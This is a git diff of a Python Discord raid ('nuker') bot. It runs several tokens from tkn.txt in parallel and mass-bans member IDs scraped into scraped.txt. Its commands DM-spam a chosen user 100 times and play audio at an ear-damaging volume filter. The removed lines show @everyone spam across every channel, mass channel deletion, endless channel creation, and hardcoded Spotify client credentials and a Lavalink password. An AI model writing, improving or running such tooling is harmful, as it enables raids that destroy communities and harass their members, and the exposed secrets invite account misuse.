@@ -1,17 +1,19 @@
+import multiprocessing
+import os
 import discord
 from discord.ext import commands
 import asyncio
 import jishaku
-import os
-import random
-BOT_TOKENS = []  
-intents = discord.Intents.all()
-intents.webhooks= True
-intents.messages = True
-async def create_bot(token, ids):
+
+def run_bot(token, ids):
+    intents = discord.Intents.all()
     bot = commands.Bot(command_prefix='!', intents=intents)
-    bot.owner_ids = [1043194242476036107, 765865384011628574, 630616794033291267]
-    await bot.load_extension("jishaku")
+    bot.owner_id = 721249954504638500
+   
+
+    @bot.command()
+    async def ping(ctx):
+        await ctx.send("pong")
 
     @bot.command()
     @commands.is_owner()
@@ -19,72 +21,26 @@ async def create_bot(token, ids):
         guild = ctx.guild
         for member_id in ids:
             try:
-                user = await bot.fetch_user(member_id)
+                user = await bot.fetch_user(int(member_id))
                 await guild.ban(user, reason="fcked")
-                await ctx.send(f"Banned {user.name} (ID: {user.id})")
-                print(f"Banned {user.name} (ID: {user.id})")
-                ids.remove(member_id)
+                await ctx.send(f"Banned {user}")
             except Exception as e:
-                print(f"Failed to ban user with ID {member_id}: {e}")
-
+                print(f"Failed to ban {member_id}: {e}")
     @bot.command()
-    @commands.is_owner()
-    async def ray(ctx, *, lund):
-        async def send_message(channel, *, lund):
-            for _ in range(150):
-                await channel.send(f"@everyone @here {lund}")
-
-        tasks = []
-        for channel in ctx.guild.text_channels:
-            task = asyncio.create_task(send_message(channel, lund))
-            tasks.append(task)
-
-        await asyncio.gather(*tasks)
-
-    @bot.command()
-    @commands.is_owner()
-    async def delete(ctx):
+    async def dmspam(ctx, userid, *, message):
         guild = ctx.guild
-        channels = guild.text_channels
-
-        random.shuffle(channels)
-
-        for channel in channels:
+        mem = guild.get_member(int(userid))
+        ded = [721249954504638500]
+        if mem in ded:
+            await ctx.send("hatt chutiye")
+            return
+        else:
             try:
-                await channel.delete()
+                for i in range(100):
+                    await mem.send(message)
+                await ctx.send(f"DM'd {mem.mention}")
             except Exception as e:
-                print(f"Error deleting channel {channel.name}: {e}")
-
-    @bot.command()
-    @commands.is_owner()
-    async def join(ctx):
-        if ctx.author.voice:
-            channel = ctx.author.voice.channel
-            voice_client = await channel.connect()
-            await ctx.send(f'Joined {channel.name} successfully!')
-        else:
-            await ctx.send("You are not in a voice channel.")
-    @tasks.loop(seconds=5)
-    async def status_task():
-            await bot.change_presence(status=discord.Status.do_not_disturb,activity=discord.activity.Game(name=next(status)))
-    @bot.command()
-    @commands.is_owner()
-    async def leave(ctx):
-        if ctx.voice_client:
-            await ctx.voice_client.disconnect()
-            await ctx.send("Left voice channel.")
-        else:
-            await ctx.send("I'm not in a voice channel.")
-
-    @bot.command()
-    @commands.is_owner()
-    async def create(ctx, name):
-        while True:
-            try:
-                await ctx.guild.create_text_channels(name=name)
-            except:
-                break
-
+                        print(f"Failed to DM {mem.mention}: {e}")
     @bot.command()
     async def play(ctx):
         
@@ -100,7 +56,7 @@ async def create_bot(token, ids):
            
             file_name = "ray.mp3"
 
-            volume_filter = f"volume=10000"
+            volume_filter = f"volume=9999"
 
       
             audio_source = discord.FFmpegPCMAudio(file_name, options=f"-af {volume_filter}")
@@ -114,42 +70,35 @@ async def create_bot(token, ids):
             await voice_client.disconnect()
         except Exception as e:
             await ctx.send(f"An error occurred: {e}")
-
-    @bot.event
-    async def node_connect():
-        await bot.wait_until_ready()
-        node: wavelink.Node = wavelink.Node(uri='lavalink.oryzen.xyz:80', password='oryzen.xyz', secure=False)
-        sc: spotify.SpotifyClient = spotify.SpotifyClient(
-            client_id='e7c9c292bbc24745b33743348e560d96',
-            client_secret='4726d6d6eba34cfe889c26844fcabc97'
-        )
-        await wavelink.NodePool.connect(client=bot, nodes=[node], spotify=sc)
-
     @bot.event
     async def on_ready():
-        await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Game(name=next(status)))
-        try:
-            print(f'{bot.user.name} logged successfully')
-        except Exception as e:
-            print(f"An error occurred in on_ready: {e}")
+        await bot.change_presence(activity=discord.Game(name="blah blah blah"))
+        await bot.load_extension("jishaku")
+        print(f"{bot.user} is ready.")
 
-    status_task.start()
-    await bot.start(token)
-os.environ["JISHAKU_NO_DM_TRACEBACK"] = "True"
-os.environ["JISHAKU_HIDE"] = "True"
-os.environ["JISHAKU_NO_UNDERSCORE"] = "True"
-os.environ["JISHAKU_FORCE_PAGINATOR"] = "True"
+    try:
+        bot.run(token)
+    except Exception as e:
+        print(f"Error running bot: {e}")
 
-async def main():
-    with open("scraped.txt", "r") as file:
-        member_ids = [line.strip() for line in file]
+def main():
+    with open("scraped.txt", "r") as f:
+        member_ids = [line.strip() for line in f]
 
-    chunk_size = (len(member_ids) + len(BOT_TOKENS) - 1) // len(BOT_TOKENS)
-    id_chunks = [member_ids[i:i + chunk_size] for i in range(0, len(member_ids), chunk_size)]
+    with open("tkn.txt", "r") as f:
+        tokens = [line.strip() for line in f]
 
-    bot_tasks = [create_bot(token, ids) for token, ids in zip(BOT_TOKENS, id_chunks)]
-    await asyncio.gather(*bot_tasks)
+    chunk_size = (len(member_ids) + len(tokens) - 1) // len(tokens)
+    chunks = [member_ids[i:i + chunk_size] for i in range(0, len(member_ids), chunk_size)]
 
+    processes = []
+    for token, ids in zip(tokens, chunks):
+        p = multiprocessing.Process(target= run_bot, args=(token, ids))
+        p.start()
+        processes.append(p)
+
+    for p in processes:
+        p.join()
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    main()
